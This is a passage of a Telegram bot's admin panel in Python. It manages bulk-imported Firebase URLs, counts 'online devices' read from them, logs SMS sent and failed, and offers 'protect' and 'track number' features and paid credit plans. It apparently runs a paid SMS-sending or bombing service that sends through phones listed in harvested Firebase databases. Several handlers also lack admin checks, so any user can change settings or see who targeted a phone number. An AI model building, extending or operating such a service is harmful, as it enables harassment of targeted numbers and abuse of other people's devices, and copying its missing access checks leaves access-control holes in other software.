    url = url.rstrip("/")
    fbs = d.setdefault("firebases", [])
    if any(fb["url"].rstrip("/") == url for fb in fbs):
        await state.clear()
        await msg.answer(
            f"{em(EMOJI_WARNING, '⚠️')} <b>already add</b>\n<code>{url}</code>",
            reply_markup=fb_menu_kb(load()),
            parse_mode="HTML",
        )
        return

    fbs.append({"id": str(int(time.time() * 1000)), "url": url, "label": label, "added_at": int(time.time())})
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Firebase saved: <code>{url}</code>", reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase (.txt)</b>\nEk .txt file bhejo jisme Firebase URLs hon.", reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    if not (msg.document.file_name or "").lower().endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt file bhejo!", parse_mode="HTML")
        return
    finfo = await msg.bot.get_file(msg.document.file_id)
    content = (await msg.bot.download_file(finfo.file_path)).read().decode("utf-8", errors="ignore")
    fbs = d.setdefault("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = 0
    already = 0
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        label, url = [x.strip() for x in line.split("|", 1)] if "|" in line else (line.replace("https://", "").split(".")[0][:20], line)
        url = url.rstrip("/")
        if url.startswith("http"):
            if url not in existing:
                existing.add(url)
                fbs.append({"id": str(int(time.time() * 1000) + added), "url": url, "label": label, "added_at": int(time.time())})
                added += 1
            else:
                already += 1
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Added: <b>{added}</b> | {em(EMOJI_WARNING, '⚠️')} already add: <b>{already}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b> ({len(d['firebases'])})", reply_markup=fb_menu_kb(load(), page), parse_mode="HTML")

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    devices = get_cached_devices() or await get_all_online_devices(d)
    st = d.get("stats", {})
    text = (
        f"{em(EMOJI_STAR, '📊')} <b>{sc('system & api stats')}</b>\n\n"
        f"{em(EMOJI_CHECK, '📤')} Total Sent   : <b>{st.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Total Failed : <b>{st.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} Online Devs  : <b>{len(devices)}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} Scanner      : {get_scan_status()}"
    )
    await cq.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʀᴇғʀᴇsʜ", "admin:stats", EMOJI_GEAR, "🔄", style="success"), btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")]]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    rows = [[btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")]] if len(d.get("owners", [])) < 6 else []
    for oid in d.get("owners", []):
        rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "👑", style="primary")] if oid == MAIN_OWNER else [btn(f"{oid}", "noop", EMOJI_CROWN, "🔱", style="primary"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text("Super Admin User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:owners:menu")]))

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        nid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid ID bhejo.")
        return
    if nid not in d.setdefault("owners", []):
        d["owners"].append(nid)
        save(d)
    await state.clear()
    await msg.answer(f"✅ Added Super Admin <code>{nid}</code>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:owners:menu")]), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    did = int(cq.data.split(":")[-1])
    if did != MAIN_OWNER and did in d.get("owners", []):
        d["owners"].remove(did)
        save(d)
    await owner_owners_menu(cq)

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in d.get("admins", []):
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡", style="primary"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text("Admin User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:admins:menu")]))

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        nid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid ID bhejo.")
        return
    if nid not in d.setdefault("admins", []):
        d["admins"].append(nid)
        save(d)
    await state.clear()
    await msg.answer(f"✅ Added Admin <code>{nid}</code>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:admins:menu")]), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    did = int(cq.data.split(":")[-1])
    if did in d.get("admins", []):
        d["admins"].remove(did)
        save(d)
    await owner_admins_menu(cq)

@R.callback_query(F.data == "admin:ban")
async def admin_ban_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    await cq.message.edit_text("Ban karne ke liye User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.ban_user)
async def admin_ban_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        bid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid ID bhejo.")
        return
    if not is_admin(bid, d) and bid not in d.setdefault("banned", []):
        d["banned"].append(bid)
        save(d)
    await state.clear()
    await msg.answer(f"🚫 Banned <code>{bid}</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "admin:unban:menu")
async def admin_unban_menu(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("Koi banned user nahi hai!", show_alert=True)
        return
    rows = [[btn(f"{bid}", f"admin:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")] for bid in banned]
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    await cq.message.edit_text("Unban karne ke liye ID tap karein:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("admin:unban:do:"))
async def admin_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    bid = int(cq.data.split(":")[-1])
    if bid in d.get("banned", []):
        d["banned"].remove(bid)
        save(d)
    await cq.answer(f"✅ Unbanned {bid}!", show_alert=True)
    await admin_home(cq, state)

@R.callback_query(F.data == "admin:broadcast")
async def admin_broadcast_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    await cq.message.edit_text("Broadcast message type karo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.broadcast)
async def admin_broadcast_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    await state.clear()
    ok = fail = 0
    for uid_str in list(d.get("users", {}).keys()):
        try:
            await msg.bot.send_message(int(uid_str), f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text or ''}", parse_mode="HTML")
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.03)
    await msg.answer(f"✅ Sent: <b>{ok}</b> | ❌ Failed: <b>{fail}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text("Credits dene ke liye User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    try:
        uid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid ID bhejo.")
        return
    await state.update_data(credit_uid=uid)
    await state.set_state(S.add_credits_amount)
    await msg.answer("Kitne credits add karne hain?")

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    try:
        amt = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid number bhejo.")
        return
    uid = int((await state.get_data()).get("credit_uid", 0))
    add_credits(uid, amt, d)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added <b>{amt}</b> credits to <code>{uid}</code>!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text("Credits katne ke liye User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    try:
        uid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid ID bhejo.")
        return
    await state.update_data(deduct_uid=uid)
    await state.set_state(S.deduct_credits_amount)
    await msg.answer("Kitne credits deduct karne hain?")

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    try:
        amt = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid number bhejo.")
        return
    uid = int((await state.get_data()).get("deduct_uid", 0))
    deduct_credits(uid, amt, d)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Deducted <b>{amt}</b> credits from <code>{uid}</code>!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text("Sabhi users ko kitne credits dene hain?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    try:
        amt = int((msg.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid positive number bhejo.")
        return
    for u_str in list(d.get("users", {}).keys()):
        add_credits(int(u_str), amt, d)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added <b>{amt}</b> credits to all users!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text("Sabhi users se kitne credits katne hain?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    try:
        amt = int((msg.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid positive number bhejo.")
        return
    for u_str, udata in d.get("users", {}).items():
        if not is_admin(int(u_str), d):
            udata["credits"] = max(0, int(udata.get("credits", 0) or 0) - amt)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Deducted <b>{amt}</b> credits from users!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.clear()
    vids = d.get("videos", [])
    rows = [[btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕", style="success"), btn("ᴄʟᴇᴀʀ ᴀʟʟ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")]]
    for idx, _ in enumerate(vids):
        rows.append([btn(f"Video #{idx+1}", "noop", EMOJI_VIDEO, "📹", style="primary"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Videos</b> ({len(vids)})", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text("Video file ya file_id bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:videos:menu")]))

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    vid = msg.video.file_id if msg.video else (msg.document.file_id if msg.document else (msg.text or "").strip())
    if vid:
        d.setdefault("videos", []).append(vid)
        save(d)
    await state.clear()
    await msg.answer("✅ Video saved!", reply_markup=kb([("ʙᴀᴄᴋ", "owner:videos:menu")]))

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    idx = int(cq.data.split(":")[-1])
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx)
        save(d)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    d["videos"] = []
    save(d)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    fj = d.setdefault("force_join", {"enabled": False, "channels": []})
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success"), btn("ᴛᴏɢɢʟᴇ ᴏɴ/ᴏғғ", "owner:fj:toggle", EMOJI_GEAR, "🔄", style="primary")],
        [btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")],
    ]
    await cq.message.edit_text(f"Force Join: <b>{'ON' if fj.get('enabled') else 'OFF'}</b> | Channels: <b>{len(fj.get('channels', []))}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery):
    d = load()
    fj = d.setdefault("force_join", {"enabled": False, "channels": []})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await owner_fj_menu(cq)

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text("Channel ID bhejo (e.g. -1001234567890):", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:fj:menu")]))

@R.message(S.fj_add_channel)
async def owner_fj_add_ch(msg: Message, state: FSMContext):
    try:
        cid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid numeric ID bhejo.")
        return
    await state.update_data(fj_cid=cid)
    await state.set_state(S.fj_add_link)
    await msg.answer("Channel invite link bhejo (https://t.me/...):")

@R.message(S.fj_add_link)
async def owner_fj_add_lnk(msg: Message, state: FSMContext):
    d = load()
    link = (msg.text or "").strip()
    cid = str((await state.get_data()).get("fj_cid", ""))
    try:
        title = (await msg.bot.get_chat(int(cid))).title or "Channel"
    except Exception:
        title = "Channel"
    chs = [c for c in d.setdefault("force_join", {}).setdefault("channels", []) if str(c["id"]) != cid]
    chs.append({"id": cid, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = chs
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added <b>{title}</b>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:fj:menu")]), parse_mode="HTML")

# ========== REDEEM CODES (CREATE + 4-5 LINE MSG + DELETE) ==========
def _build_redeem_menu(d: dict) -> tuple[str, InlineKeyboardMarkup]:
    codes = d.get("redeem_codes", {})
    lines = [f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b> ({len(codes)})"]
    rows = [[btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")]]
    for c, info in list(codes.items())[:12]:
        cr = info.get("credits", 0)
        ul = info.get("uses_left", 0)
        lines.append(f"• <code>{c}</code> — 💰{cr} ({ul} left)")
        rows.append([
            btn(f"{c} • 💰{cr}", "noop", EMOJI_GIFT, "🎟", style="primary"),
            btn("ᴅᴇʟᴇᴛᴇ", f"owner:redeem:del:{c}", EMOJI_CROSS, "🗑", style="danger"),
        ])
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    text, markup = _build_redeem_menu(load())
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:redeem:del:"))
async def owner_redeem_delete(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:del:", 1)[1].strip()
    codes = d.get("redeem_codes", {})
    if code in codes:
        codes.pop(code, None)
        save(d)
        await cq.answer(f"🗑 Deleted {code}!", show_alert=True)
    else:
        await cq.answer("⚠️ Code nahi mila!", show_alert=True)
    text, markup = _build_redeem_menu(load())
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text("Kitne credits ka code banana hai?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:redeem:menu")]))

@R.message(S.gen_redeem_credits)
async def owner_redeem_cr(msg: Message, state: FSMContext):
    try:
        cr = int((msg.text or "").strip())
        if cr <= 0:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid positive number bhejo.")
        return
    await state.update_data(gen_cr=cr)
    await state.set_state(S.gen_redeem_uses)
    await msg.answer("Kitni baar redeem ho sakta hai?")

@R.message(S.gen_redeem_uses)
async def owner_redeem_us(msg: Message, state: FSMContext):
    d = load()
    try:
        uses = int((msg.text or "").strip())
        if uses <= 0:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid positive number bhejo.")
        return
    cr = int((await state.get_data()).get("gen_cr", 10))
    code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    d.setdefault("redeem_codes", {})[code] = {"credits": cr, "uses_left": uses, "used_by": []}
    save(d)
    await state.clear()

    share_msg = (
        f"🎁 <b>NEW REDEEM CODE DROP!</b>\n"
        f"🎟 Redeem Code: <code>{code}</code>\n"
        f"💰 Reward: <b>{cr} Credits</b> | Uses Left: <b>{uses}</b>\n"
        f"⚡ Bot me <b>Redeem</b> tap karke jaldi claim karo!"
    )
    await msg.answer(
        share_msg,
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", f"owner:redeem:del:{code}", EMOJI_CROSS, "🗑", style="danger"), btn("ʀᴇᴅᴇᴇᴍ ᴍᴇɴᴜ", "owner:redeem:menu", EMOJI_GIFT, "🎟", style="primary")],
                [btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")],
            ]
        ),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    lines = [
        f"{em(EMOJI_MONEY, '💳')} <b>Plans</b>\n",
        f"<b>{sc('credits')}</b>: {CREDIT_CONTACT_HANDLE} | <b>{sc('owner')}</b>: {SUPER_ADMIN_NAME} 👇\n",
    ]
    for p in plans:
        lines.append(f"• <b>{p['name']}</b> — ₹{p['price']} ({p.get('days', 0)}d)")
    rows = [
        [btn_url("ᴄᴏɴᴛᴀᴄᴛ @ᴛᴄxsᴜ ɴᴏᴡ", CREDIT_CONTACT_LINK, EMOJI_MONEY, "💳", style="success")],
        [btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")],
    ]
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.protect_number)
    await cq.message.edit_text("Protect karne ke liye number bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    num = (msg.text or "").strip()
    d.setdefault("protected_numbers", {})[num] = msg.from_user.id
    save(d)
    await state.clear()
    await msg.answer(f"🔒 Protected <code>{num}</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery):
    d = load()
    prot = d.get("protected_numbers", {})
    txt = "\n".join(f"🔒 <code>{n}</code>" for n in prot) or "Koi protected number nahi."
    await cq.message.edit_text(f"<b>Protected Numbers</b>\n\n{txt}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.track_number)
    await cq.message.edit_text("Track karne ke liye number bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    num = (msg.text or "").strip()
    hits = [f"• <code>{u_str}</code>" for u_str, hist in d.get("sms_history", {}).items() if any(h.get("number") == num for h in hist)]
    await state.clear()
    await msg.answer(f"<b>Tracker:</b> <code>{num}</code>\n\n" + ("\n".join(hits) or "No records"), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:activity")
async def owner_activity_cb(cq: CallbackQuery):
    d = load()
    entries = d.get("activity_log", [])[-15:]
    lines = [f"[{fmt_time(e.get('timestamp', 0))}] <code>{e.get('uid')}</code> <b>{e.get('action')}</b> — {e.get('details', '')}" for e in reversed(entries)]
    await cq.message.edit_text("<b>Activity Log</b>\n\n" + ("\n".join(lines) or "Empty"), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_hist_cb(cq: CallbackQuery):
    d = load()
    total = sum(len(v) for v in d.get("sms_history", {}).values())
    await cq.message.edit_text(f"<b>Global SMS History</b>\nTotal entries: <b>{total}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings")
async def owner_settings_cb(cq: CallbackQuery, state: FSMContext):
    d = load()
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(f"Referral Credits (current: <b>{d.get('settings', {}).get('ref_credits', 2000)}</b>)\nNaya value bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]))

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    try:
        c = int((msg.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await msg.answer("❌ Valid number bhejo.")
        return
    d.setdefault("settings", {})["ref_credits"] = c
    save(d)
    await state.clear()
